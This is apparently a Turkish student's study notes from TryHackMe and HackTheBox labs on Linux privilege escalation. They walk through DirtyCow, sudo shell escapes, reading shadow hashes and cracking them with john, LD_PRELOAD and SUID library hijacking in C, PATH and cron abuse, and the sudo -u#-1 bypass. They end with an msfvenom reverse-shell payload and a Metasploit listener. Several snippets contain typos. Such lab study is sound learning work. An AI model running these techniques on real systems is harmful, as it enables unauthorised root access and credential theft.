+cd .. > uname -a komutunu çalıştırarak bağlı olduğumuz işletim sisteminin ne olduğunu ve sürümünü öğrenebiliriz.
+
+yine aynı şekilde cat /proc/version komutunu çalıştırarak ynı ancak daha detaylı bilgileri elde edebiliriz
+
+ps aux komutunu çalıştırarak bağlı olduğumuz sistemde çalıştırılan bütün process leri görebiliriz.
+
+karşımıza gelen çıktıda USER sütununun altındaki bilgi (kullanıcısının adı) ilgili process in hangi kullanıcıs tarafından başlatıldığı bilgisini bize verir
+
+COMMAND sütunudaki bilgi ilgili process i hangi komut kullanılarak başlatıldığı bilgisini bie verir
+
+yine cat /etc/passwd çalıştırarak sistemde hangi kullanıcılar var bunu görüntüleyebiliriz.
+
+kullanıcıs isminin yer aldığı satırın en sonunda ilgili kullanıcısının kullandığı shell in path ini (ismini) görebiliriz.
+
+sistemdkei bütün kullanıcıların şifrelerini hashlenmiş bir şekilde görmek için de cat /etc/shadow çalıştırabiliriz permission denied hatası aldık çünkü bu dosyayı görüntülemeye iznimiz yok.
+
+sistemdeki kullanıcıların kim olduklarını bilmek yetki yükseltme sürecinde yetkisi az olandan daha yetkili bir kullanıcıya geçişte bize bir ifkir verir.
+
+ağ ile ilgili bilgi almak için ifconfig çalıştırabiliriz.
+
+ip route komuutnu çalıştırarak hangi bilgileri elde ederiz bunu araştır buraya yaz.
+
+arp -a çalıştırarak ağdaki cihazların mac ve ip değerlerini görebiliriz (arp tablosunu görebiliriz.)
+
+find / -name= password 2> /dev/null komutu ne işe yarıyor açıkla detaylı bir şekilde.
+
+(neden 2 yazdık bunu araştır buraya yaz)
+
+history çalıştırdığımızda sistemde daha önce çalıştırılan komutları görebiliriz.
+
+bir ctf de flagleri bulmak için kullanacağımız toolları ilgili ctf makinesinde wget yüklü mü bunu kontrol ederek wget ile indirip kurabiliriz.
+
+ancak bu makinemizin internete bir bağlantısı olmadığı için makinada built-in olarak gelen toolları kullanmamız gerekiyor.
+
+https://github.com/carlospolop/PEASS-ng ve https://github.com/rebootuser/LinEnum bu bağlantıdaki toolları kullanabiliriz.
+
+https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh bağlantısından de LinEnum.sh dosyasının bash scriptlerine ulaşabiliriz.
+
+örneğin cd /tmp > wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh çalıştırırsak 
+
+ilgili bu bash scriptini internete bağlı bir cihaza indirebiliriz.
+
+ardından cd home > cd user diyerek /home/user dizinine gidiyoruz ardından cd tools çalıştırıyoruz
+
+daha sonra cd linux-exploit-suggester > ./linux-exploit-suggester çalıştırıyoruz bu tool bize kullanmış olduğumuz linux sisteme göre root olmamızı sağlayacak bir exploit önerisinde bulunuyor.
+
+aldığımız çıktılardan 
+
+[+] [CVE-2016-5195] dirtycow 
+
+ve onun hemen bir aşağısındaki 
+
+[+] [CVE-2016-5195] dirtycow2 ctflerde sıklıkla karşımıza çıkar.
+
+ardından 
+
+[+] [CVE-2016-5195] dirtycow kısmının altındaki Download URL: https://www.abc.com url sini kopyalıyoruz.
+
+kali firefox tarayıcımızda açıyoruz.
+
+ve direkt olarak ilgili exploit in c kodunu içeren dosyayı indirme penceresi açıldı Save File > OK diyerek dosyamızı indiriyoruz.
+
+dirty ow bir kernel exploit dir. kernel: bilgisayarımızda donanım ile yazılımların arasında bu ikisinin birbirtleriyle sağlıklı bir iletişim kurmasını sağlayan bir yazılımdır.
+
+(kernel hangi görevleri yapar araştır buraya yaz)
+
+sonuç olarak kernel de bir yazılım olduğu için içerisinde açıklar bulunabilir. ve kernel da bulduğumuz bir zaafiyet iligli sisteme tam olarak sahip olabileceğimiz anlamına gelebilir.
+
+bu yüzden bir ctf çözerken ilk bakmamız gereken exploit türü kernel exloit tir.
+
+bununla beraber sistemde uname -a çalıştırdıktan sonra aldığımız Linux debian 2.6.32-5-amd64 çıktısını kopyalayıp Linux debian 2.6.32-5-amd64 exploit şeklinde google da aratıyoruz ve ardından ilk sırada çıkan
+
+https://www.exploit-db.com/exploits/40839 bağlantısına gittiğimizde dirtycow ın exploit db sayfasına gitmiş oluruz.
+
+/home/user/tools/dirtycow dizinine gidiyoruz bu dizinde c0w.c dosyası var bu az önce sistemimize indirmiş olduğumuz kernel exploit i içeren c dosyasıdır.
+
+bu exloit c kodunu çalıştıırlabilir bir koda dönüştürmek için derleyici denilen bir tool kullanmamız gerekiyor bunun için de bunu da 
+
+https://github.com/exrienz/DirtyCow bağlantısındaki yönlendirmeleri takip ederek yapbiliriz hedef sistemimiz 32 bit olduğu için biz 
+
+Usage Example For 32 Bit
+
+    $ gcc dc32.c -o cowroot -pthread
+    $ ./cowroot
+    $ echo 0 > /proc/sys/vm/dirty_writeback_centisecs
+
+
+    yönergesini takip etmemiz gerekiyor.
+
+    gcc = (GNU Compiler Collection)
+
+
+gcc c0w.c -pthread -o dirtycow çalıştırıyoruz ardından ls dediğimizde dirtycow isminde yeşil renkli bir çalıştırılabilir bir dosya olduğunu görüyoruz.
+
+ardından ./dirtycow çalıştırıyoruz ve bir süre beklemmemiz gerekiyor exploit kodunun çalıştırılması için ardından bize bir kaç satırdan oluşan bir çıktı verecek ardından user@debian şeklinde bizi shell e atacak daha sonra passwd çalıştırdığımızda root olduğumuzu görüyoruz 
+
+ve eğer makine ile bağlantımız giderse try hack me deki süremiz dolmuş olabilir o yüzden ctf i çözerken süremizi sık sık kontrol etmeliyiz ve makineyi yeniden doploy ettiğimizde makineye bağlanacağımız ip adresi değişmiş olabilir o yüzdeen bir dakika bekleyip güncel ip adresiyle bağlanmayı deneyelim
+
+ve bağlantımız koptuktan sonra tekrar bağlantığımızda çalıştırılaiblir c dosyasının olmadığını görüyoruz çünkü bağlantı sonlandığında sistemdeki değişiklikler de silinir yani bağlantı sonlanırsa bu işlemleri baştan yapmamız gerekiyor.
+
+ve root a geçtikten sonra tekrar user kullanıcısına dönmek istersek su user çalıştırabiliriz.
+
+
+user@debian kullanıcısında ~ dizinindeyken ls -la çalıştırıyoruz
+
+cat .bash_history çalıştırırsak daha önce kullandığımız terminalde çalıştırılan komutları / bash komutlarını / komutların geçmişini gösteriyor (history komutu ile aynı işi yapıyor.)
+
+bu komut geçmişini okuma sebebimiz burada daha önce çalıştırılan ve sisteme ait önemli bilgileri içeren veya hacklemek istediğimiz bir uygulamaya root ile giriş yapıop komutta da root un şifresinin geçmesi gibi önemli bilgileri elde edebiliriz bu yüzden burayı kontrol etmek çok önemlidir.
+
+örneğin .bash_history i çalıştırdıktan sonra gelen çıktıda yukarıdan 2. komutta mysql -h somehost.local -uroot -ppassword123 şeklinde bir komut çalıştırıldığını görüyoruz bu komut ile mysql veritabanına root kullanıvısı ile ve root kullanıcısının şifresi olan password123 bilgisiyle giriş yapılmış.
+
+yine ~ dizinindeykenrecon aşamasında içerisinde password kelimesinin geçtiği bütün dosya isimlerini, find komutu ile getirebiliriz.
+
+find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \; çalıştırarak sistemdeki, içerisinde PASSWORD (büüyk küçük hard duyarlılığı var mı yoksa içeirisnde password veya Password) kelimeleri geçen dosya isimlerini de bize verir mi 
+
+(burada kullanılan parametreler ne işe yarıyor araştır buraya yaz)
+
+eskiden linux sistemlerde kullanıcı isimler ve bu kullanıcı isimlerinin şifreleri /etc/passwd dizinindeki dosyada tutulurdu -hashlenmiş bir şekilde-
+
+daha sonra bu hashlenmiş parola bilgisi /etc/shadow dizinindeki dosyada tutulmaya başlandı
+
+bu dersimizde sudo list / bazı sudo açıklarını öğrenelim sisteme user@debian ile giirş yaptıktan sonra 
+
+/~ dizinindeyken sudo -l çalıştırdığımızda aldığımız 
+
+(root) NOPASSWORD: /usr/sbin/iftop 
+(root) NOPASSWORD: /usr/bin/find
+(root) NOPASSWORD: /usr/bin/nano
+(root) NOPASSWORD: /usr/bin/vim
+
+gibi çıktılar bize user kullanıcısı ile sudo komutunu kullanarak root olmadan root yetkileriyle çalıştırabileceğimiz uygulama / dosyaların listesini verir 
+
+burada (root) kısmı hangi kullanıcı yetkileriyle çalıştırabileceğimizi NOPASSWORD: kısmı da ilgili dosyayı hangi kullanıcı ile çalıştırabiliyorsak bu kullanıcının şifresini girmeden yaabildiğimiz anlamına geliyor.
+
+örneğin vim programını sudo ile root yetkileriyle açıp root kullanıcısı olmayı öğrenelim şimdi.
+
+sudo /usr/bin/vim -c '!/bin/sh' çalıştırdıktan sonra whoami çalıştırırsak root olduğumuzu görebiliriz.
+
+sudo -l çalıştırdıktan sonra şifre girmeden apache2 servisini root yetkileriyle çalıştırabildiğimizi görüyoruz.
+
+sudo /usr/sbin/apache2 -f /etc/shadow çalıştırdıktan sonra Invalid command çıktısından sonra gelen 'root... ::' şeklinde iki ' karakter arasındaki yazılar sudo /usr/sbin/apache2 -f /etc/passwd çalıştırdıktan sonra gelen çıktıdaki blgiler örneğin her iki komutu da çalıştırdıktan sonra gelen 
+
+root:abc:xyz şeklinde iki nokta üst üste ile ayrılan karakterdeki sırayla ayrılan kısımlar aynı bilgiyi ifade eder örneğin burada root = root kullanıcısı anlamına gelir. 
+
+sudo /usr/sbin/apache2 -f /etc/passwd de root:x:0:0 şeklindeki bilgiler de aynı şekildedir 
+
+(x, 0 ve 2. sıfır ın hangi bilgileri ifade ettiğini araştır buraya yaz)
+
+
+'root... ::' stringi de root kullanıcısının parolasını ifade eder. bu stringi kopyalıyoruz 
+
+ardından nano shadow.txt çalıştırıyoruz ve kopyaladığımız stringi buraya yapıştırıyoruz.
+
+ardından ctrl+o > ctrl+x yaparak çıkıyoruz. daha sonra nano passwd.txt > sudo /usr/sbin/apache2 -f /etc/passwdçalıştırdıktan sonra aldığımı 'root... /bin/bash' stringini yapıştırıyoruz.
+
+ardından ctrl o ctrl x yaparak çıkıyoruz.
+
+ardından unshadow passwd.txt shadow.txt çalıştırdıktan sonra aldığımız çıktı passwd.txt ve shadow.tx nin içindeki stringlerin içindeki verileri shadowlanmış yani kullanıcı ile ilgili hassas bilgilerin gölgelenmiş (yani hashlenmiş veya ilgili hassas bilginin olduğu yere anlamsız bir karakter konulmuş) halinden bu bilgileri brute force ile deneyebileceğimiz bir formata dönüştürüyor
+
+
+unshadow kullanıcı-sifresinin-bulunduğu-dosya shadow-dosyası şeklinde kullanılır.
+
+(tabii unshadow ile bütün kullanıcıların password ve shadow bilgilerini bu şekilde tek bir komut ile eşleştirebiliriz ancak bizim dosyalarımızda sadece root un bilgisi olduğu için sadece root u eşleştirdi.)
+
+
+unshadow passwd.txt shadow.txt > passwords.txt çalıştırıyoruz. ardından nano wordlist.txt çalıştırıyoruz 
+
+ve 
+
+james123
+james321
+password123
+password321 
+
+parolalarını yapıştırıp ctrl+o ctrl+x yaparak çıkıyoruz.
+
+ardından john --wordlist=wordlist.txt passwords.txt çalıştırıyoruz > john --showpasswords.txt çalıştırdıktan sonra 
+
+root:james123 şeklinde root kullanıcısının şifresini aldığımızı görebiliyoruz 
+
+(yukarıda shadow ve password stringlerini nano ile oluşturduğumuz metin belgesine kopyalarken tırnak işaretleri ile mi yoksa tırnak işaretleri olmadan bu kopyalıyoruz dene, hangisi buraya yaz.)
+
+ardından su root > james123 çalıştırdığımızda başarılı bir şekilde root olduğumuzu görebiliriz.
+
+user@debian kullanıcısı ile sisteme giriş yaptıktan sonra sudo -l çalıştırınca gelen çıktının 
+
+2. satırının sonundaki LD_PRELOAD nedir bunu araştır buraya yaz.
+
+/home/user dizinindeyken nano library.c çalıştırıyoruz.
+
+(aşağıdaki kodda #include komutu ile C dilinde ilgili [#include den sonra yazılan isimdeki] kütüphaneleri -pythondaki import gibi- içe aktarabiliyoruz.)
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib
+
+void _init(){
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash")
+}
+
+(kodda void yazmamızın sebebi geriye hiç bir çıktı döndürmemesi için yazdığımız bir koddur void bu işe yarar eğer örneğin bu kodu çalıştırdıktan sonra 1 çıktısı almak isteseydik void yerine int yazardık)
+
+( unsetenv("LD_PRELOAD"); kodu da un set enviroments yani LD_PRELOAD isimli çevresel değiikenin içeriğini değiştirmemiz için yazdığımız bir kod)
+
+(set guid(0) ,le bu kod çalıştırıldığında çalıştıran kullanıcının group id sini 0 yap yani onu root grubuna al ve setuid(0) komutu ile user yani mevcut kullanıcımızın user id sini 0 yap yani onu root yap diyoruz)
+
+daha sonra ctrl+o ve ctrl+x ile çıkıyoruz şimdi bu c kodunu compile etmemiz lazım -derlememiz- (derlemek/compile = c kodunu çalıştırılabilir bir hale getirmek)
+
+bunun için de gcc -fPIC -shared -o /tmp/library.so library.c -nostartfiles çalıştırıyoruz 
+
+(burada parametrede geçen PIC ifadesi Position-independent code anlamına gelir)
+
+ardından sudo LD_PRELOAD=/tmp/library.so nmap çalıştırdığımızda başarılı bir şekilde root olduğumuzu görebiliyoruz 
+
+system("/bin/bash") komutu ile de root olduktan sonra shell alıyoruz 
+
+(en son root olmak için yazdığımız kodda nmap yazmamızın sebebi de bu c kodunu sudo -l çıktısında root yetkisi ile çalıştırabileceğimiz bir uygulama ile çalıştırarak bu şekilde rot olmayı sağlamak içindir.)
+
+bu dersimizde suid detaylarını öğrenelim.
+
+setuid (set *owner user id) /suid de denir. [sahip kullanıcı kimliğini ayarla demektir]
+
+suid yi ayarlayarak mevcut kullanıcı ile, mevcut kullanıcının gerçekleştirmeye izni olmadığı bir işlemi, izni olan bir kullanıcının izinleriyle gerçekleştirebiliriz.
+
+ls -la çalıştırdığımızda çıktı olarak aldığımız -r-w-e şeklinde izinleri gösteren kısımda s karakterini görürsek bu suid den dolayı ilgili dosyanın mevcut kullanıcı ile çalıştırılabileceği anlamına gelir.
+
+chmod +x çalıştırırsak ilgili dosyayı mevcut kullanıcımız tarafından çalıştırılaiblir hale getiririz 
+
+(örneğin dosya ismi abc olsun bu dosyayı çalıştırılabilir hale getirmek için yazmamız gereken komut nedir araştır buraya yaz)
+
+aynı şekilde chmod +s komutunun ne işe yaradığını araştır buraya yaz
+
+şimdi de mevcut kullanıcımızla, root yetkisiyle çlaıştırabileceğimiz dosyaları bulmak için 
+
+find / -type f -perm 04000 -s 2>/dev/null çalıştırabiliriz
+
+(find . şeklinde komutumuzu yazarsak aramayı güncel klasörde yaparız)
+
+(-perm 04000 şeklinde neden bu sayıyı ayarladık araştır buraya yaz)
+
+ve bu komutu çalıştırdıktan sonra gelen çıktılardan /usr/local/bin/suid.so çalıştıralım 
+
+(neden özellikle bu dosya sebebini araştır buraya yaz)
+
+bu dersimizde suid yetki yükseltmesi konusunu öğrenelim.
+
+user kullanıcısı ile ~ dizinindeyken 
+
+/usr/local/bin/suid.so çalıştırıyoruz. ardından calculating something please wait..
+
+ve 99% de takılı kalan bir işlemin çıktısını aldık 
+
+bu dosyayı çalıştırdığımızda sistemde hangi işlemler gerçekleştiriyor bunu öğrenmemiz gerekiyor.
+
+bunu strace toolunu kullanarak öğrenebiliriz. bu tool çalıştıracağımız binary dosyasının çalıştırıldıktan itibaren son sürece kadar ne yaptığını trace etmemize yani izlememizi sağlıyor.
+
+strace /usr/local/bin/suid.so çalıştırıyoruz. ve ekranı kaplayan loading çıktılarını görüyoruz ancak o kadar fazlalar ki terminal hepsini yazdıramamış. 
+
+strace /usr/local/bin/suid.so 2>&1 | more çalıştırdığımızda alacağımız çıktının tamamını enter tuşuna basarak satır satır görüntüleyebiliyoruz 
+
+(komuttaki 2>&1 ne işe yarıyor neden böyle yazdık ve more nedir neden burada bunu kullandık araştır buraya yaz)
+
+bu çıktılarda kısaca ilgili binary i çalıştırdıktan sonra hangi dizim veya dosyalar ile ilgili bir işlem yapmaya çalıştığını görüyoruz.
+
+bazı satırların en sonunda parantez içinde (No such file or directory) yazısının olduğunu görüyoruz.
+
+(bu yazıyı almamızın sebebi ulaşmaya çalıştığı dosya/dizin gerçekten sistemde yok mu yoksa erişmeye iznimiz olmadığı için mi bu çıktıyı alıyoruz araştır buraya yaz)
+
+biz eğer bu yazıya sahip olan dosyaların içeriğini değiştirerek / veya o dosyayı oluşturarak içerisine root olmamızı sağlayabilecek kodu yerleştirirsek bu dosyayı çalıştırdığımızda o dosya da çalıştırılacağından root olaibliriz bu yüzden (No such file or directory) yazan bütün satırları grep ile almaya çalışalım.
+
+
+strace /usr/local/bin/suid.so 2>&1 | grep -i -E "open|access|no such file" çalıştırıyoruz 
+
+bu komutta -i ve -E parametrelerinin ne işe yaradığını araştır buraya yaz içerisinde open veya access veya no such file ifadesi geçen bütün atırları çıktı olarak filtreledik ve çok daha az bir çıktı aldık.
+
+aldığımız çıktıdaki satırların başındaki access geçenler ilgili dosya veya dizine erişmeye çalıştığını, open ifadesi de ilgili dizini veya dosyayı açmaya çalıştığı anlamına geliyor.
+
+en son satırdaki çıktıda /home/user/.config/libcalc.so isimli bir dosyayı açmaya çalıştıpını görüyoruz çünkü satırın başında open ifadesi var ancak .config isimli bir dizinin sistemde var olmadığını kontrol ettiğimizde görüyoruz peki biz bu isimde bir dizin ve devamındaki isimde bir dosya oluşturarak root olma kodumuzu bu dosyaya yerleştirerek bu dosya çalıştırıldığında root olabilir miyiz? evet olabiliriz.
+
+/~ dizinindeyken mkdir .config çalıştırıyoruz. cd .config > nano libcalc.c çalıştırıyoruz.
+
+
+#include >stdio.h>
+#include <stdlib.h> 
+
+static void atil() __attribute__((constructor));
+
+void atil() {
+    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");   
+}
+
+
+yazıp ctrl+o-x yaparak çıkıyoruz.
+
+şimdi de bu düzenlediğimiz .c dosyasını shared object -bu terim nedir araştır buraya yaz- yani .so dosyasına çevirere kçalıştırılabilir hale getirelim.
+
+gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/.config/libcalc.c çalıştırıyoruz.
+
+ardından /usr/local/bin/suid-so çalıştırdıktan sonra whoami çalıştırırsak root çıktısını alırız.
+
+
+
+
+
+
+(koddaki static komutu ile static in kapsamındaki kodları hafızada başka bir yerde tutarak e bütün program boyunca ulaşılaiblir hale getiren bir komuttur.
+
+constructor, bir sınıftan bir obje oluşturulduğunda çağırılacak ilk metod, yaılacak ilk işlem / işlemler anlamına gelir.)
+
+(komuttaki cp /bin/bash ile shell imizi kopyaladık ve chmod +s ile bu shell imizi suid ile mevcut kullanıcımız tarafından çalıştırılabilir ve çaloştırıldığında root yetkileriyle açabileceğimiz bir hale getirdik daha sonra /tmp/bash ile shell imizi çağırarak çalıştırdık burada -p parametresi ne işe yaradı neden bunu kullanıdk araştır buraya yaz)
+
+(satırların sonundakiler ; mı yoksa : mı çalışmazsa ikisinden birini tekrar dene)
+
+sisteme user kullanıcısı ile giriş yapıyoruz.
+
+find / -type f -perm 04000 -ls 2>/dev/null çalıştırdıktan sonra gelen çıktılarda sonunda 
+
+/usr/local/bin/suid-env ifadesi olan satırla ilgileniyoruz bu dersimizde.
+
+daha sonra /usr/local/bin/suid-env çalıştırıyoruz ve aldığımız çıktıda Already running yani dosya halihazırda şuan zaten çalıştırılıyormuş.
+
+strace /usr/local/bin/suid-env çalıştırarak bu dosya çalıştırıldığında sistemde hangi işlemlerin gerçekleştirildiğini öğrenebiliriz.
+
+(strace ile izlediğimiz bir dosyada eğer dosyanın gerçekleştirmek istediği işlem için mevcut kullanıcının izni yoksa işlem satırının en sonunda (Operation not permitted) ifadesi yazar)
+
+strings /usr/local/bin/suid-env çalıştırdığımızda ne olduğunu tam anlamadım bu komut un görevi ne ne işe yarıyor araştır buraya yaz.
+
+linux da örneğin apache2 start dediğimizde veya clear, python, cd, whoami dediğimizde bu syntax daki kelimenin ne işe yaradığını terminal çevresel değişkenler aracılığıyla anlıyor bu yazılar isminde bir çevresel değişken oluşturuluyor ve bu değişkenin değeri olarak da, yani bu değişkeni terminalde yazıp enter a bastığımızda değişkenin değeri olan kod çalıştırılıp ilgili komuta dair bilgileri / işlemleri çıktı olarak alıyoruz veya gerçekleştirmiş oluyoruz.
+
+(çevresel değişkenin değeri olarak bir kod mu belirleniyor yoksa çevresel değişken bir dosyaya bağlanıp bu değişken çağrıldığında o dosya çalıştırıldığından dolayı mı komut doğru bir şekilde çalıştırılmış oluyor bunu araştır buraya yaz.)
+
+cd /usr/bin > ls -la çalıştırıldığımızda çalıştırılabilir pek çok dosyanın olduğunu görüyoruz işte çevresel değişkenlerin bağlandığı dosyalar buradadır.
+
+biz de strings /usr/local/bin/suid-env çalıştırdığımızda aldığımız çıktının son satırında apache2 start komutunun çalıştırıldığını görmüştük eğer apache2 start çevresel değişkeninin değerini değiştirip root olmamızı sağlayabilecek bir komut yaparsak root olabiliriz.
+
+bu dersimizde çevresel değişkenleri / dğeişkenlerinin değerlerini nasıl değiştirebileceğimizi öğrenelim.
+
+user kullanısıcındayken /~ dizinindeyken 
+
+echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/service.c çalıştırıyoruz. 
+
+gcc /tmp/service.c -o /tmp/service çalıştırarak service.c kodunu executable bir dosya haline getiriyoruz.
+
+ardından export PATH=/tmp:$PATH çalıştırdıktan sonra print $PATH çalıştırdığımızda oluşturduğumuz ve ismi PATH olan ortam değişkenini print $PATH diyerek çağırmış / çalıştırmış oluruz.
+
+find / -type f -perm 04000 -ls 2>/dev/null çalıştırdığımızda, /usr/local/bin/suid-env dizininin içerisindeki service isimli bir çevresel değişken çalıştırılacağı ve aynı adda bir çevresel değişken oluşturup onun içerisine de root olmamaızı sağlayan kodu koyduğumuz için find / -type f -perm 04000 -ls 2>/dev/null çalıştırdığımızda, anında root olduğumuzu görebiliriz. 
+
+(burayı tam anlamadım service isminde compile ettiğimiz dosya /home/user dizinindeydi suid-env dosyası apache2 start ismindeki ortam değişkenini çalıştırmaya çalışmıyor muydu bizimkini nedne çalıştırdı yoksa PATH ortam değişkenlerinin hepsini mi çalıştırıyordu bunu araştır buraya yaz)
+
+bu dersimizde cron ile iligli işlemlerde yetki yükseltmesi konusunu öğrenelim.
+
+user ile sisteme bağlandıktan sonra 
+
+cat /etc/crontab çalıştırarak zamanlanmış işlemleri görebiliriz.
+
+sondan sekizinci satırda SHELL=/bin/sh şeklinde kullanılan shell in sh olduğunu görüyoruz.
+
+(linuxda PATH veya $PATH nedir ne anlama gelir neyi ifade eder ctf çözümlerinde ne önemi var araştır buraya yaz)
+
+son 2 satırda 
+
+root overwrite.sh 
+
+root /usr/local/bin/compress.sh şeklinde 2 satır bir veri var bu veriler 
+
+overwrite.sh ve  /usr/local/bin/compress.sh dizinindeki dosyaların root tarafından çalıştırılacağını söylüyor.
+
+şuan biz home dizinindeyiz ve ls çalıştırırsak overwrite.sh isminde bir dosya olmadığını görebiliriz.
+
+diğer dosyanın var olup olmadığını doğrulamak için cat /usr/local/bin/compress.sh çalıştırdığımızda 
+
+böyle bir dosyanın olduğunu görüyoruz ve bu .sh dosyasının içeriğini terminalimizde çıktı olarak aldık.
+
+son 2 satırdan önce mevcut cronların / cron tablerin ne zaman çalıştırılacağını belirten bir tablo var 
+
+burada
+
+ 17 * * * * 
+
+ 25 6 * * * 
+
+ 42 6 * * 7 
+
+ gibi farklı farklı ifadeler var bu ifadelerin ilgili cron un hangi sıklıkta çalıştırılacağını anlamak için 
+
+ https://crontab.guru/ bağlantısında deneyerek öğrenebiliriz.
+
+ bizim son iki satırımızın en başındaki ifade * * * * * şeklindeydi bu da ilgili cron un her dakika çalıştırıldığı anlamına gelir.
+
+ biz cat /etc/crontab komutunu /home/user dizininde çalıştırdığımız ve son 2 satırdan üstteki dosyanın ismi direkt olarak overwrite.sh olduğu için buradan bu dosyanın da bizim mevcut dizinimizde olduğu/olması gerektiğini anlıyoruz yoksa onun bir altındaki satırda olduğu gibi dosyanın absolute path i verilirdi.
+
+ardından echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash ' > /home/user/overwrite.sh çalıştırıyoruz.
+
+chmod +x /home/user/overwrite.sh çalıştırarak overwrite.sh dosyamızın çalıştırılabilir olmasıyla ilgili izinlerini veriyoruz.
+
+ardından bir dakika geçtikten sonra /tmp/bash -p çalıştırdığımızda root olduğumuzu görebiliriz 
+
+(/tmp/bash -p komutu burada ne işe yaradı ne yatı nasıl root olmamızı sağladı buradaki -p parametresinin görevi ne araştır buraya yaz)
+
+bu dersimizde sudo daki versiyon açığını kullanarak root olmayı öğrenelim 
+
+https://tryhackme.com/room/sudovulnsbypass bağlantısındaki odaya join olduktan sonra makineyi deplot ediyoruz.
+
+ssh -p 2222 tryhackme@MACHINE_IP (machine ip = tryu hack me nin bu oda için deploy ettikten 1 dakika sonra bize verdiği ip adresi) çalıştırdıktan sonra 
+
+Username: tryhackme
+Password: tryhackme
+
+bilgileriyle login oluyoruz.
+
+sudo -u#-1 /bin/bash çalıştırdıktan sonra whoami çalıştırırsak root olduğumuzu görebiliriz 
+
+buradkai açık şu, şimdi bu komut normalde sudo -u#0 şeklinde yani UİD (user id) yi 0 olarak ayarlayıp (uid 0 = root un uid si) bu şekilde ilgili uid ye sahip kullanıcının yetkileriyle sudo -u#<id> <command> formatında bir komut çalıştıraibliryoruz linuxda. 
+
+ancak sudo -u#0 /bin/bash şeklinde çalıştırsaydık ya bize bu komutu root olarak çalıştıramayacağımızı, ya da root un şifresini istedikten sonra komutumuzu çalıştıracaktı biz de buradaki 0 değerini -1 olarak değiştirip denediğimizde root olduğumuzu görüyoruz.
+
+bu dersimizde hack the box dan bahsedelim.
+
+https://app.hackthebox.eu/invite bağlantısından htb da bir üyelik oluşturabiliriz.
+
+hesabımızı oluşturduktan sonra getting started tabından vpn connection / access kısmına giriyoruz 
+
+ve burada try hack me de olduğu gibi bizim için oluşturulan vpn dosyasını arıyoruz ui(user interface) 7kullanıcıs arayüzü sürekli dğeiştirildiği için bu dosya farklı yerlerde de olabilir.
+
+bu dosyayı kali lokalimize indiriyoruz. ardından terminale geliyoruz cd Downloads > openvpn vpn-ismi.ovpn çalıştırarak hack the box ağına bağlanıyoruz.
+
+ardından htb ın search kısmından Devel yazarak ilgili makinanın sayfasına gidiyoruz.
+
+htb da retired ve güncel şeklinde 2 adet makina türü var retired makinakara yalnızca vip üyeler erişebiliyor onun dışında normal bir üyeliğimiz varsa sadece güncel makinelere erişebiliyoruz.
+
+Ardından Devel in sayfasında makine isminin yazdığı hizada altta Spawn Machine butonuna basarak makinemizi başlatıyoruz.
+
+eğer belil bir süre geçtikten sonra Devel in sayfasında bize makinenin ip adresini göstermiyorsa host makinemizin tarayıcısından htb a girip oradan ip yi kontrol edebiliriz
+
+örneğin bu uygulamammız için Devel in ip si 10.10.10.5 olsun 
+
+kali terminalimize gelip nmap -T4 -A -v -p- 10.10.10.5 çalıştırıyoruz (bu komuttaki bütün parametrelerin ne işe yaradığını araştır buraya yaz)
+
+PORT     STATE     SERVICE     VERSION 
+21/tcp   open        ftp        Microsoft ftpd
+
+
+
+şeklinde nmap taramasının çıktısı olarak hangi portların açık/filtreli olduğuyla ilgili bazı bilgileri edinebiliriz.
+
+bu tablonun 2. satırında ftp-anon: Anonymous FTP login allowed (FTP code 230)
+ şeklinde bir çıktı alıyoruz. yani burada kullanıcı adı ve şifre olarak Anonymous yazarak ftp servisine erişebiliyoruz.
+
+ bu tablonun en sonuncu satırının altındaki bilgide 
+
+ ftp-syst:
+SYST: Windıws NT 
+
+bilgisini görüyoruz bu ftp nin üzerinde çalıştığı işletim sistmeinin Windows olduğu anlamına geliyor.
+
+çıktılar içinde aşağıda Aggressive OS guesses: (satırında bize hangi bilgilerin verildiğini araştır buraya yaz)
+
+ardından kali terminalimizde ftp 10.10.10.5 çalıştırıyoruz 
+
+Kullanıcı Adı: anonymous
+Şifre: anonymous 
+
+bilgileriyle giriş yapıyoruz.
+
+dir çalıştırdığımızda aynı linuxda olduğu gibi bulunduğumuz mevcut dizindeki dosya ve dizinleri ekrana bastırabiliriz.
+
+biz giriş yapmış olduğumuz bu ftp sevisine / sunucusuna çalıştırıldığında bize Devel makinesinde bize bir reverse shell verebilecek bir dosya upload edebilir miyiz bunu deneyelim.
+
+Ancak Devel bir windows makine olduğu için rever shell i alabileceğimiz kod PHP değil de asp, aspx, aps.net gibi dillerde olursa shell alma işlemimiz çok daha olası olur çünkü her windows sunucu php yi desteklemeyebilir.
+
+bu zararlıyı da msfvenom kullanarak oluşturalım çünkü msfvenom,meterpreter gibi toollarla windows da shell aldığımızda içeriye girdiktwen sonra yetki yükseltmemiz çok daha kolay oluyor kendi yazdığımız bir kod ile veya aspx ile yazılmış bir kod ile de bunu yapabilirdik ancak otomatize etme ve kolaylık açısından bu uygulamamızda msfvenom u kullanalım 
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#windows-stageless-reverse-tcp bağlantısınaki 
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe
+
+kodunu kopyalıyoruz ve kali terminalimize yapıştırıyoruz ancak buradaki LHOST kısmını değiştirmemiz gerekiyor 
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=kali-local-ip LPORT=4242 -f aspx > atil.aspx
+
+çalıştırarak zararlı dosyamızı oluşturuyoruz.
+
+ardından kali terminalimizde -devel e bağlı olan terminal değil başka bir terminal tabında- 
+
+msfconsole çalıştırıyoruz ardından use exploit/multi/handler çalıştırıyoruz. daha sonra set payload windows/meterpreter/reverse_tcp yazıp enterlıyoruz.
+
+ardından set LHOST kali-ip yazıp enterlıyoruz.
+
+set LPORT 4242 çalıştırıyoruz.
+
+ardından exploit -j -z çalıştırıyoruz. ardından Devel e ftp servisinden bağlandığımız terminele gidiyoruz.
+
